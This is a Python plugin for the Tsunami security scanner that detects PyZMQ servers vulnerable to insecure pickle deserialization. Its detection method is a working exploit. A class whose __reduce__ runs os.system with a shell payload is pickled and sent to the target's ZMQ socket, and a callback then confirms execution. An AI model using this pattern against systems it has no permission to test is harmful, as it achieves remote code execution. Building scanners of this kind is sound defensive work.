"""A Tsunami plugin for detecting PyZMQ insecure deserialization RCE."""

# Copyright 2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pickle
import time

from absl import logging
import zmq

from google.protobuf import timestamp_pb2
import tsunami_plugin
from common.data import network_service_utils
from common.net.http.http_client import HttpClient
from plugin.payload.payload_generator import PayloadGenerator
import detection_pb2
import payload_generator_pb2 as pg
import plugin_representation_pb2
import vulnerability_pb2

_VULN_DESCRIPTION = 'This detector checks for an exposed PyZMQ TCP server.'
_SLEEP_TIME_SEC = 10


class PyZmqRceDetector(tsunami_plugin.VulnDetector):
  """A Tsunami Plugin that detects RCE on the PyZMQ target."""

  def __init__(
      self, http_client: HttpClient, payload_generator: PayloadGenerator
  ):
    self.http_client = http_client
    self.payload_generator = payload_generator

  def GetPluginDefinition(self) -> tsunami_plugin.PluginDefinition:
    """Defines the PluginDefinition for PyZmqRceDetector.

    Returns:
      The PluginDefinition used for the Tsunami engine to identify this plugin.
    """
    return tsunami_plugin.PluginDefinition(
        info=plugin_representation_pb2.PluginInfo(
            type=plugin_representation_pb2.PluginInfo.VULN_DETECTION,
            name='PyZmqRceDetector',
            version='0.1',
            description=_VULN_DESCRIPTION,
            author='mr-mosi',
        )
    )

  def Detect(
      self,
      target: tsunami_plugin.TargetInfo,
      matched_services: list[tsunami_plugin.NetworkService],
  ) -> tsunami_plugin.DetectionReportList:
    """Run detection logic for the PyZMQ target.

    Args:
      target: TargetInfo about PyZMQ Insecure Deserialization.
      matched_services: A list of network services whose vulnerabilities could
        be detected by this plugin. "ppp" for example would be on this list.

    Returns:
      A tsunami_plugin.DetectionReportList for all the vulnerabilities of the
      scanning target.
    """
    logging.info('PyZMQRceDetector starts detecting.')
    vulnerable_services = [
        service
        for service in matched_services
        if self._IsPyZmqTcpService(service)
    ]
    logging.info('Found vulnerable service:\n%s\n', vulnerable_services)
    return detection_pb2.DetectionReportList(
        detection_reports=[
            self._BuildDetectionReport(target, service)
            for service in vulnerable_services
            if self._IsServiceVulnerable(service)
        ]
    )

  def _IsPyZmqTcpService(
      self, network_service: tsunami_plugin.NetworkService
  ) -> bool:
    """Check if network service is a zmtp service."""
    logging.info(
        'network_service_utils.get_service_name(network_service): %s',
        network_service_utils.get_service_name(network_service),
    )
    return (
        network_service_utils.get_service_name(network_service)
        == 'zeromq zmtp 2.0'
    )

  def _IsServiceVulnerable(
      self, network_service: tsunami_plugin.NetworkService
  ) -> bool:
    """Check if network service may result in RCE."""

    config = pg.PayloadGeneratorConfig(
        vulnerability_type=pg.PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE,
        interpretation_environment=pg.PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL,
        execution_environment=pg.PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT,
    )
    payload = self.payload_generator.generate(config)
    if not payload.get_payload_attributes().uses_callback_server:
      return False

    class Payload:

      def __reduce__(self):
        return (
            __import__('os').system,
            (f'/bin/sh -c " {payload.get_payload()}"',),
        )

    try:
      context = zmq.Context()
      socket = context.socket(zmq.REQ)
      socket.connect(
          f'tcp://{network_service.network_endpoint.ip_address.address}:{network_service.network_endpoint.port.port_number}'
      )

      serialized_payload = pickle.dumps(Payload())
      socket.send(serialized_payload)
    except Exception:  # pylint: disable=broad-exception-caught
      logging.exception(
          'Unable to query %s', network_service.network_endpoint.hostname
      )
      return False

    time.sleep(_SLEEP_TIME_SEC)
    socket.close()
    context.term()
    return payload.check_if_executed()

  def _BuildDetectionReport(
      self,
      target: tsunami_plugin.TargetInfo,
      vulnerable_service: tsunami_plugin.NetworkService,
  ) -> detection_pb2.DetectionReport:
    """Generate the detection report for all vulnerability findings."""
    return detection_pb2.DetectionReport(
        target_info=target,
        network_service=vulnerable_service,
        detection_timestamp=timestamp_pb2.Timestamp().GetCurrentTime(),
        detection_status=detection_pb2.DetectionStatus.VULNERABILITY_VERIFIED,
        vulnerability=vulnerability_pb2.Vulnerability(
            main_id=vulnerability_pb2.VulnerabilityId(
                publisher='TSUNAMI_COMMUNITY', value='PyZmqRceDetector'
            ),
            severity=vulnerability_pb2.Severity.CRITICAL,
            title='PyZMQ TCP Server Insecure Deserialization RCE',
            recommendation=(
                'Users Should be aware of the exposed PyZMQ TCP server and'
                ' should take necessary steps to secure it with proper'
                ' authentication.'
            ),
            description=_VULN_DESCRIPTION,
        ),
    )
